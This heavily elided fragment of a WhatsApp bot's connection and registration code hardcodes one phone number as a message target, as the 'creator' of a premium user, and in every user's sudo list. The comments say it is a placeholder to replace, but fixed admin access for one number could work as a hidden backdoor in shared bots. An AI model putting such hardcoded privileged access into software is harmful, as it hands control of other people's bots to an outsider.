...
async function connectToWhatsapp(handleMessage) {
    ...
    sock.ev.on('connection.update', async (update) => {
        ...
        if (connection === 'close') {
            ...
            try {
                const chatId = '2250555898207@s.whatsapp.net'; // ton numéro ou le groupe cible
    ...
    setTimeout(async () => {
        if (!state.creds.registered) {
            ...
            try {
                ...
                if (asPremium === true) {
                    configmanager.premiums.premiumUser['c'] = { creator: '2250555898207' };
                    configmanager.saveP();
                ...
                setTimeout(() => {
                    configmanager.config.users[number] = {
                        sudoList: ['2250555898207@s.whatsapp.net'], // emplace par ton numéro WhatsApp 
